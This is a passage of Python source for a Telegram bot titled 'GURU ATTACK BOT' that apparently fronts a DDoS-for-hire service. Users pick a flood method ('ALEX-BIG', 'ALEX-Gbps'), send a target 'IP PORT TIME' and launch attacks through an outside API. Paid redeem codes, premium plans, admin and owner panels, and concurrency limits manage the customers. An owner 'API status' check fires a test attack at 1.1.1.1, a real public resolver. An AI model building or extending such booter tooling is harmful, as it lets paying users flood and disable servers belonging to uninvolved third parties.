    can_start, msg = await attack_manager.can_start_attack(user_id)
    if not can_start:
        await query.edit_message_text(msg, parse_mode='Markdown')
        return

    keyboard = [
        [InlineKeyboardButton("💥 ALEX-BIG (4c)", callback_data="method_ALEX-BIG")],
        [InlineKeyboardButton("🚀 ALEX-Gbps (2c)", callback_data="method_ALEX-Gbps")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")],
    ]
    await query.edit_message_text(
        "💥 *Select method*\n\n"
        "• **ALEX-BIG** — normal (4 concurrent)\n"
        "• **ALEX-Gbps** — bota (2 concurrent)\n\n"
        "After selecting, send: `IP PORT TIME`",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown',
    )
    context.user_data['awaiting_attack'] = True


async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    method = query.data.replace('method_', '')
    context.user_data['attack_method'] = method
    conc = METHOD_CONCURRENT.get(method, 1)
    await query.edit_message_text(
        f"📡 *Method: {method}* ({conc}c)\n\n"
        f"Send: `IP PORT TIME`\n"
        f"Example: `8.8.8.8 80 60`\n\n"
        f"⏱️ {MIN_DURATION}-{MAX_DURATION}s\n"
        f"Send /cancel to cancel",
        parse_mode='Markdown',
    )


async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    plan, expiry = db.get_user_plan(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)

    if plan == "free" and not is_owner:
        text = "👤 *MY PLAN*\n\n📊 Plan: 🆓 FREE\n\n💡 `/redeem CODE` to upgrade."
    elif is_owner:
        text = "👑 *OWNER ACCESS*\n\n📊 Plan: 💎 PREMIUM\n📡 ALEX-BIG (4c) · ALEX-Gbps (2c)"
    elif expiry:
        days_left = max(0, (expiry - datetime.now()).days)
        text = (f"👤 *MY PLAN*\n\n📊 Plan: 💎 PREMIUM\n"
                f"⏱️ Remaining: {days_left} days\n"
                f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M')}")
    else:
        text = "👤 *MY PLAN*\n\n📊 Plan: 💎 PREMIUM\n⏱️ LIFETIME"

    await query.edit_message_text(
        text, parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]]),
    )


async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not db.is_admin(query.from_user.id):
        await query.answer("Access denied!", show_alert=True)
        return
    users = db.get_all_users()
    admins = db.get_admins()
    stats = attack_manager.get_stats()
    total_attacks = db.get_total_attacks()
    banned = len([u for u in users if u.get('is_banned')])
    premium = sum(1 for u in users if u.get('plan') == 'premium')
    await query.edit_message_text(
        f"📊 *BOT STATISTICS*\n\n"
        f"👥 Users: {len(users)}\n"
        f"💎 Premium: {premium}\n"
        f"🚫 Banned: {banned}\n"
        f"👑 Admins: {len(admins)}\n"
        f"💥 Attacks: {total_attacks}\n"
        f"⚡ Active: {stats['active_attacks']}",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]]),
    )


async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not db.is_admin(query.from_user.id):
        await query.answer("Access denied!", show_alert=True)
        return
    keyboard = [
        [InlineKeyboardButton("➕ GENERATE CODE", callback_data="admin_gen")],
        [InlineKeyboardButton("📋 LIST CODES", callback_data="admin_list")],
        [InlineKeyboardButton("🗑️ DELETE UNUSED CODE", callback_data="admin_delete")],
        [InlineKeyboardButton("❌ DELETE ANY CODE", callback_data="admin_delete_any")],
        [InlineKeyboardButton("🚫 REVOKE MEMBERSHIP", callback_data="admin_revoke")],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")],
    ]
    await query.edit_message_text(
        "⚙️ *ADMIN PANEL*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown',
    )


async def admin_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("📅 1 DAY", callback_data="gen_1d")],
        [InlineKeyboardButton("📅 3 DAYS", callback_data="gen_3d")],
        [InlineKeyboardButton("📅 7 DAYS", callback_data="gen_7d")],
        [InlineKeyboardButton("📅 30 DAYS", callback_data="gen_30d")],
        [InlineKeyboardButton("📅 LIFETIME", callback_data="gen_lifetime")],
        [InlineKeyboardButton("🔙 BACK", callback_data="admin")],
    ]
    await query.edit_message_text(
        "➕ *GENERATE CODE*\n\nSelect duration:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown',
    )


async def process_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data.split('_')[1]
    days = 3650 if data == "lifetime" else int(data.replace('d', ''))
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    if db.create_code(code, days, query.from_user.id):
        duration_text = "LIFETIME" if days >= 3650 else f"{days} days"
        await query.edit_message_text(
            f"✅ *CODE GENERATED*\n\nCode: `{code}`\nDuration: {duration_text}",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]]),
        )
    else:
        await query.edit_message_text("❌ Failed to generate code!")


async def admin_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    codes = db.get_codes()
    if not codes:
        text = "📋 No codes generated yet."
    else:
        text = "📋 *REDEEM CODES*\n\n"
        for c in codes[:10]:
            status = "✅" if not c.get('is_used') else "❌ Used"
            duration_text = "LIFETIME" if c['access_days'] >= 3650 else f"{c['access_days']}d"
            text += f"`{c['code']}` - {duration_text} - {status}\n"
    await query.edit_message_text(
        text[:4000], parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]]),
    )


async def admin_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    codes = db.get_codes(only_unused=True)
    if not codes:
        await query.edit_message_text(
            "📋 No unused codes to delete!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]]),
        )
        return
    keyboard = []
    for c in codes[:10]:
        code = c['code']
        keyboard.append([InlineKeyboardButton(f"❌ {code}", callback_data=f"delunused_{code}")])
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="admin")])
    await query.edit_message_text(
        "🗑️ *DELETE UNUSED CODES*\n\nSelect a code:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown',
    )


async def process_delete_unused_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    code = query.data.replace('delunused_', '')
    if db.delete_code(code):
        await query.edit_message_text(
            f"✅ Code `{code}` deleted!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]]),
        )
    else:
        await query.edit_message_text("❌ Failed to delete code!")


async def admin_delete_any_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not db.is_admin(query.from_user.id):
        await query.answer("Access denied!", show_alert=True)
        return
    codes = db.get_codes()
    if not codes:
        await query.edit_message_text(
            "📋 No codes to delete!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]]),
        )
        return
    keyboard = []
    for c in codes[:15]:
        code = c['code']
        status = "✅" if not c.get('is_used') else "❌"
        keyboard.append([InlineKeyboardButton(f"{status} {code}", callback_data=f"delany|{code}")])
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="admin")])
    await query.edit_message_text(
        "❌ *DELETE ANY CODE*\n\n"
        "Select a code (used or unused):\n"
        "⚠️ Does NOT revoke membership — use REVOKE for that.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown',
    )


async def process_delete_any_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not db.is_admin(query.from_user.id):
        await query.answer("Access denied!", show_alert=True)
        return
    code = query.data.split('|', 1)[1]
    code_data = db.get_code_by_value(code)
    if not code_data:
        await query.edit_message_text("❌ Code not found!")
        return
    was_used = code_data.get('is_used', False)
    used_by = code_data.get('used_by')
    if db.delete_any_code(code):
        msg = f"✅ Code `{code}` deleted!"
        if was_used and used_by:
            msg += (f"\n\n⚠️ Was used by `{used_by}`. "
                    f"Membership NOT revoked.")
        await query.edit_message_text(
            msg, parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]]),
        )
    else:
        await query.edit_message_text("❌ Failed to delete code!")


async def admin_revoke_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not db.is_admin(query.from_user.id):
        await query.answer("Access denied!", show_alert=True)
        return
    codes = db.get_codes()
    used_codes = [c for c in codes if c.get('is_used')]
    keyboard = []
    for c in used_codes[:8]:
        code = c['code']
        used_by = c.get('used_by', 'Unknown')
        keyboard.append([InlineKeyboardButton(
            f"🚫 {code} → {used_by}",
            callback_data=f"revokecode|{code}",
        )])
    keyboard.append([InlineKeyboardButton("✏️ ENTER USER ID MANUALLY", callback_data="revoke_manual")])
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="admin")])
    await query.edit_message_text(
        "🚫 *REVOKE MEMBERSHIP*\n\n"
        "Select a used code, or enter user ID manually.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown',
    )


async def process_revoke_code_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not db.is_admin(query.from_user.id):
        await query.answer("Access denied!", show_alert=True)
        return
    code = query.data.split('|', 1)[1]
    success, result = db.revoke_membership_by_code(code)
    if success:
        await query.edit_message_text(
            f"✅ *MEMBERSHIP REVOKED*\n\n"
            f"Code: `{code}`\nUser: `{result}`\nPlan: FREE",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]]),
        )
    else:
        await query.edit_message_text(
            f"❌ *REVOKE FAILED*\n\nReason: {result}",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]]),
        )


async def revoke_manual_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "✏️ *REVOKE BY USER ID*\n\n"
        "Send the user ID:\nExample: `123456789`\n\n"
        "Send /cancel to cancel.",
        parse_mode='Markdown',
    )
    context.user_data['awaiting_revoke'] = True


async def process_revoke_manual(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_revoke'):
        return
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_revoke'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    admin_id = update.effective_user.id
    if not db.is_admin(admin_id):
        context.user_data['awaiting_revoke'] = False
        return
    try:
        target_user_id = int(update.message.text.strip())
        if db.is_owner_or_pseudo(target_user_id):
            await update.message.reply_text("❌ Cannot revoke owner's membership!")
            context.user_data['awaiting_revoke'] = False
            return
        if not db.get_user(target_user_id):
            await update.message.reply_text(f"❌ User {target_user_id} not found!")
            context.user_data['awaiting_revoke'] = False
            return
        if db.cancel_user_membership(target_user_id):
            await update.message.reply_text(
                f"✅ *MEMBERSHIP REVOKED*\n\nUser: `{target_user_id}`\nPlan: FREE",
                parse_mode='Markdown',
            )
        else:
            await update.message.reply_text(f"❌ Failed to revoke {target_user_id}")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    context.user_data['awaiting_revoke'] = False


async def admin_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📢 *BROADCAST*\n\nSend me the message. /cancel to cancel.",
        parse_mode='Markdown',
    )
    context.user_data['awaiting_broadcast'] = True


async def process_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_broadcast'):
        return
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_broadcast'] = False
        await update.message.reply_text("✅ Broadcast cancelled.")
        return
    if not db.is_admin(update.effective_user.id):
        context.user_data['awaiting_broadcast'] = False
        return
    users = db.get_all_users()
    if not users:
        await update.message.reply_text("❌ No users to broadcast to!")
        context.user_data['awaiting_broadcast'] = False
        return
    progress_msg = await update.message.reply_text(f"📢 Broadcasting to {len(users)} users…")
    successful = 0
    for i, user in enumerate(users):
        if db.is_banned(user['user_id']):
            continue
        try:
            await context.bot.send_message(
                chat_id=user['user_id'],
                text=update.message.text,
                parse_mode='Markdown',
            )
            successful += 1
        except Exception:
            pass
        if (i + 1) % 10 == 0:
            try:
                await progress_msg.edit_text(
                    f"📢 *Broadcasting…*\n{i+1}/{len(users)}\n✅ {successful}",
                    parse_mode='Markdown',
                )
            except Exception:
                pass
        await asyncio.sleep(0.05)
    await progress_msg.edit_text(
        f"✅ *Broadcast Complete!*\n\n"
        f"👥 Total: {len(users)}\n✅ Success: {successful}\n❌ Failed: {len(users) - successful}",
        parse_mode='Markdown',
    )
    context.user_data['awaiting_broadcast'] = False


async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    pause_info = db.get_pause_info()
    pause_status = pause_info.get('paused', False)
    pause_text = "▶️ RESUME BOT" if pause_status else "⏸️ PAUSE BOT"
    stats = attack_manager.get_stats()
    keyboard = [
        [InlineKeyboardButton("👑 PROMOTE ADMIN", callback_data="owner_promote")],
        [InlineKeyboardButton("👑 DEMOTE ADMIN", callback_data="owner_demote")],
        [InlineKeyboardButton("🚫 BAN USER", callback_data="owner_ban")],
        [InlineKeyboardButton("✅ UNBAN USER", callback_data="owner_unban")],
        [InlineKeyboardButton("📋 LIST ADMINS", callback_data="owner_list_admins")],
        [InlineKeyboardButton("📋 LIST USERS", callback_data="owner_list_users")],
        [InlineKeyboardButton("❌ CANCEL MEMBERSHIP", callback_data="owner_cancel_membership")],
        [InlineKeyboardButton(pause_text, callback_data="owner_pause")],
        [InlineKeyboardButton("🔌 API STATUS", callback_data="owner_api_status")],
        [InlineKeyboardButton("🛑 STOP ALL ATTACKS", callback_data="owner_stop")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")],
    ]
    await query.edit_message_text(
        f"👑 *OWNER PANEL*\n\n"
        f"Status: {'⏸️ PAUSED' if pause_status else '🟢 ACTIVE'}\n"
        f"⚡ Active Attacks: {stats['active_attacks']}\n"
        f"📡 Methods: ALEX-BIG (4c), ALEX-Gbps (2c)",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown',
    )


async def owner_cancel_membership_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not db.is_owner_or_pseudo(query.from_user.id):
        await query.answer("Access denied!", show_alert=True)
        return
    users = db.get_all_users()
    premium_users = [u for u in users
                     if u.get('plan') == 'premium'
                     and not db.is_owner_or_pseudo(u.get('user_id'))]
    keyboard = []
    for u in premium_users[:10]:
        uid = u.get('user_id')
        username = u.get('username', 'N/A')
        keyboard.append([InlineKeyboardButton(
            f"❌ {uid} - @{username}",
            callback_data=f"cancelmem_{uid}",
        )])
    keyboard.append([InlineKeyboardButton("✏️ ENTER USER ID", callback_data="cancelmem_manual")])
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="owner")])
    await query.edit_message_text(
        "❌ *CANCEL MEMBERSHIP*\n\nSelect a premium user, or enter ID.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown',
    )


async def process_cancel_membership_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not db.is_owner_or_pseudo(query.from_user.id):
        await query.answer("Access denied!", show_alert=True)
        return
    target_user_id = int(query.data.replace('cancelmem_', ''))
    if db.is_owner_or_pseudo(target_user_id):
        await query.edit_message_text("❌ Cannot cancel owner's membership!")
        return
    if db.cancel_user_membership(target_user_id):
        await query.edit_message_text(
            f"✅ *MEMBERSHIP CANCELLED*\n\nUser: `{target_user_id}`\nPlan: FREE",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]]),
        )
    else:
        await query.edit_message_text(
            f"❌ Failed to cancel {target_user_id}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]]),
        )


async def cancel_membership_manual_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "✏️ *CANCEL MEMBERSHIP BY USER ID*\n\n"
        "Send the user ID:\nExample: `123456789`\n\n"
        "Send /cancel to cancel.",
        parse_mode='Markdown',
    )
    context.user_data['awaiting_cancel_membership'] = True


async def process_cancel_membership_manual(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_cancel_membership'):
        return
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_cancel_membership'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    if not db.is_owner_or_pseudo(update.effective_user.id):
        context.user_data['awaiting_cancel_membership'] = False
        return
    try:
        target_user_id = int(update.message.text.strip())
        if db.is_owner_or_pseudo(target_user_id):
            await update.message.reply_text("❌ Cannot cancel owner's membership!")
            context.user_data['awaiting_cancel_membership'] = False
            return
        if not db.get_user(target_user_id):
            await update.message.reply_text(f"❌ User {target_user_id} not found!")
            context.user_data['awaiting_cancel_membership'] = False
            return
        if db.cancel_user_membership(target_user_id):
            await update.message.reply_text(
                f"✅ *MEMBERSHIP CANCELLED*\n\nUser: `{target_user_id}`\nPlan: FREE",
                parse_mode='Markdown',
            )
        else:
            await update.message.reply_text(f"❌ Failed to cancel {target_user_id}")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    context.user_data['awaiting_cancel_membership'] = False


async def owner_stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not db.is_owner_or_pseudo(query.from_user.id):
        await query.answer("Access denied!", show_alert=True)
        return
    success, msg = await attack_manager.stop_attack(query.from_user.id)
    if success:
        await query.edit_message_text(
            f"🛑 *All Attacks Stopped!*\n\n{msg}",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]]),
        )
    else:
        await query.edit_message_text(f"❌ {msg}")


async def owner_pause_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    current = db.get_pause_info().get('paused', False)
    if current:
        db.set_pause(False, user_id)
        await query.edit_message_text(
            "✅ *Bot Resumed*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]]),
        )
    else:
        db.set_pause(True, user_id, "Owner paused")
        await query.edit_message_text(
            "⏸️ *Bot Paused*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]]),
        )


async def owner_promote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("👑 PROMOTE ADMIN\n\nSend: USER_ID\n/cancel to cancel")
    context.user_data['awaiting_promote'] = True


async def process_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_promote'):
        return
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_promote'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    try:
        user_id = int(update.message.text.strip())
        user = db.get_user(user_id)
        if not user:
            await update.message.reply_text(f"❌ User {user_id} not found.")
            return
        if db.is_admin(user_id):
            await update.message.reply_text(f"❌ {user_id} is already admin!")
            return
        db.add_admin(user_id, user.get('username', 'Unknown'), "admin", update.effective_user.id)
        await update.message.reply_text(f"✅ User {user_id} promoted to ADMIN!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    context.user_data['awaiting_promote'] = False


async def owner_demote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    admins = db.get_admins()
    keyboard = []
    for admin in admins:
        aid = admin['user_id']
        if aid != OWNER_ID and admin.get('level') != "pseudo_owner":
            keyboard.append([InlineKeyboardButton(f"❌ {aid}", callback_data=f"demote_{aid}")])
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="owner")])
    await query.edit_message_text(
        "👑 DEMOTE ADMIN\n\nClick to demote:",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )


async def process_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = int(query.data.split('_')[1])
    if uid == OWNER_ID:
        await query.edit_message_text("❌ Cannot demote the owner!")
        return
    if db.remove_admin(uid):
        await query.edit_message_text(
            f"✅ Admin {uid} demoted!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]]),
        )
    else:
        await query.edit_message_text("❌ Failed to demote!")


async def owner_ban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("🚫 BAN USER\n\nSend user ID.\n/cancel to cancel.")
    context.user_data['awaiting_ban'] = True


async def process_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_ban'):
        return
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_ban'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    try:
        uid = int(update.message.text.strip())
        if uid == OWNER_ID:
            await update.message.reply_text("❌ Cannot ban the owner!")
            context.user_data['awaiting_ban'] = False
            return
        if db.is_admin(uid):
            await update.message.reply_text("❌ Cannot ban an admin!")
            context.user_data['awaiting_ban'] = False
            return
        db.ban_user(uid, "Banned by owner", update.effective_user.id)
        await update.message.reply_text(f"✅ User {uid} banned!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    context.user_data['awaiting_ban'] = False


async def owner_unban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("✅ UNBAN USER\n\nSend user ID.\n/cancel to cancel.")
    context.user_data['awaiting_unban'] = True


async def process_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_unban'):
        return
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_unban'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    try:
        uid = int(update.message.text.strip())
        db.unban_user(uid)
        await update.message.reply_text(f"✅ User {uid} unbanned!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    context.user_data['awaiting_unban'] = False


async def owner_list_admins_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    admins = db.get_admins()
    if not admins:
        await query.edit_message_text("👑 No admins found.")
        return
    text = "👑 ADMIN LIST\n\n"
    for admin in admins:
        level = admin.get('level', 'admin').upper()
        aid = admin['user_id']
        user = db.get_user(aid)
        uname = user.get('username', 'N/A') if user else 'N/A'
        text += f"• {aid} - @{uname} - {level}\n"
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]]),
    )


async def owner_list_users_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    users = db.get_all_users()
    if not users:
        await query.edit_message_text("📋 No users found.")
        return
    text = "👥 ALL USERS\n\n"
    for user in users[:20]:
        uid = user.get('user_id')
        uname = user.get('username', 'N/A')
        plan = user.get('plan', 'free').upper()
        banned = "🚫" if user.get('is_banned') else "✅"
        star = "⭐" if db.is_admin(uid) else ""
        text += f"{banned}{star} {uid} - @{uname} ({plan})\n"
    if len(users) > 20:
        text += f"\n... and {len(users) - 20} more"
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]]),
    )


async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not db.is_owner_or_pseudo(query.from_user.id):
        await query.answer("Access denied!", show_alert=True)
        return
    await query.edit_message_text("🔌 Checking API…")
    if not API_TOKEN:
        await query.edit_message_text("❌ API_TOKEN missing in .env")
        return
    r = await send_api_attack("1.1.1.1", 80, 10, "ALEX-BIG")
    if r.get("success"):
        text = (f"✅ API OK\n"
                f"Status: `{r.get('status')}` | {r.get('elapsed', 0):.2f}s\n"
                f"Attack ID: `{r.get('attack_id')}`")
    else:
        text = (f"❌ API FAILED\n"
                f"Error: `{r.get('error')}`\n"
                f"Raw: `{str(r.get('response'))[:150]}`")
    await query.edit_message_text(
        text, parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 REFRESH", callback_data="owner_api_status")],
            [InlineKeyboardButton("🔙 BACK", callback_data="owner")],
        ]),
    )


async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    is_admin = db.is_admin(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)
    keyboard = []
    if not db.is_banned(user_id):
        keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
    if is_admin:
        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    if is_owner:
        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
    await query.edit_message_text(
        "👋 WELCOME BACK",
        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
    )


async def message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('awaiting_attack'):
        await process_attack(update, context)
    elif context.user_data.get('awaiting_promote'):
        await process_promote(update, context)
    elif context.user_data.get('awaiting_ban'):
        await process_ban(update, context)
    elif context.user_data.get('awaiting_unban'):
        await process_unban(update, context)
    elif context.user_data.get('awaiting_broadcast'):
        await process_broadcast(update, context)
    elif context.user_data.get('awaiting_revoke'):
        await process_revoke_manual(update, context)
    elif context.user_data.get('awaiting_cancel_membership'):
        await process_cancel_membership_manual(update, context)


async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    args = update.message.text.split()
    context.args = args
    await attack_command(update, context)
    context.user_data['awaiting_attack'] = False


# ===== MAIN =====
def main():
    if not TELEGRAM_TOKEN:
        print("❌ TELEGRAM_TOKEN not set!")
        return
    if not API_TOKEN:
        print("⚠️ API_TOKEN not set — attacks will fail.")

    print("=" * 60)
    print("🔥 GURU ATTACK BOT — alex.works API")
    print("=" * 60)
    print("Methods:")
    print("  ALEX-BIG   → /api/start       (4 concurrent)")
    print("  ALEX-Gbps  → /api/bota/start  (2 concurrent)")
    print("=" * 60)

    bot_app = Application.builder().token(TELEGRAM_TOKEN).build()

    # Commands
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CommandHandler("attack", attack_command))
    bot_app.add_handler(CommandHandler("stop", stop_command))
    bot_app.add_handler(CommandHandler("testapi", testapi_command))
    bot_app.add_handler(CommandHandler("status", status_command))
    bot_app.add_handler(CommandHandler("redeem", redeem_command))
    bot_app.add_handler(CommandHandler("revoke", revoke_command))
    bot_app.add_handler(CommandHandler("myid", myid_command))
    bot_app.add_handler(CommandHandler("cancel", cancel))

    # Specific patterns BEFORE generic ones
    bot_app.add_handler(CallbackQueryHandler(cancel_membership_manual_callback, pattern="^cancelmem_manual$"))
    bot_app.add_handler(CallbackQueryHandler(process_cancel_membership_callback, pattern="^cancelmem_\\d+$"))
    bot_app.add_handler(CallbackQueryHandler(process_delete_any_callback, pattern="^delany\\|"))
    bot_app.add_handler(CallbackQueryHandler(process_revoke_code_callback, pattern="^revokecode\\|"))

    bot_app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    bot_app.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
    bot_app.add_handler(CallbackQueryHandler(my_plan_callback, pattern="^my_plan$"))
    bot_app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
    bot_app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    bot_app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
    bot_app.add_handler(CallbackQueryHandler(admin_gen_callback, pattern="^admin_gen$"))
    bot_app.add_handler(CallbackQueryHandler(process_gen_callback, pattern="^gen_"))
    bot_app.add_handler(CallbackQueryHandler(admin_list_callback, pattern="^admin_list$"))
    bot_app.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
    bot_app.add_handler(CallbackQueryHandler(admin_delete_any_callback, pattern="^admin_delete_any$"))
